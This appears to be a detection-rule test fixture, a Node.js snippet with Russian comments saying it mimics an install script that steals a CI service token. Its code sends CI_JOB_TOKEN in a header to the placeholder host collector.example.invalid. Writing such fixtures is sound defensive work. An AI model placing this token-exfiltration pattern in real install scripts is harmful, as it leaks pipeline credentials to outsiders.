// Образец для проверки правила: установочный скрипт уносит токен сервисной учётки.
// Это НЕ рабочая вредоносная нагрузка — здесь нет ни настоящего адреса, ни настоящего
// токена. Файл существует ради одного: убедиться, что правило действительно срабатывает.
const https = require('https');

const req = {
  hostname: 'collector.example.invalid',
  path: '/collect',
  method: 'POST',
  headers: { "PRIVATE-TOKEN": process.env.CI_JOB_TOKEN }
};

https.request(req, () => {}).end();
